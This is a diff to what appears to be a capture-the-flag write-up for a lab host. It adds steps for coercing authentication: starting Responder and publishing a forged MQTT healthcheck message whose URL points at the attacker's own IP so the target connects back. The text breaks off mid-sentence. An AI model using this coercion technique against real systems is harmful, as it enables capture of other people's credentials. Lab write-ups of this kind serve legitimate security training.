@@ -175,6 +175,8 @@ So all users apart from `gpz-tools-admin` gives the error `PREAUTH FAILED` which
 
 There is also 6 public repos i can look through
 
+# Coercing authentication
+
 There is nothing too interesting in any of the repos and all of them only have one commit so no interesting commit history
 
 ```python
@@ -190,3 +192,11 @@ So if i can send a message using `mosquitto_sub` i might be able to coerce it ba
 ```python
 sudo responder -I tun0
 ```
+
+First ill start responder
+
+```python
+mosquitto_pub -h dc01.ghostlink.htb -p 1883 -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' -m '{"timestamp":"2026-30-09-15:35:50","node":"node-6","telemetry":{"healthy":true,"url":"10.10.14.61/healthcheck","lastCheckSecAgo":12,"responseCode":"200","ip":"172.16.20.10"}}' -r
+```
+
+Ill use the exact same message from before, all ill ch
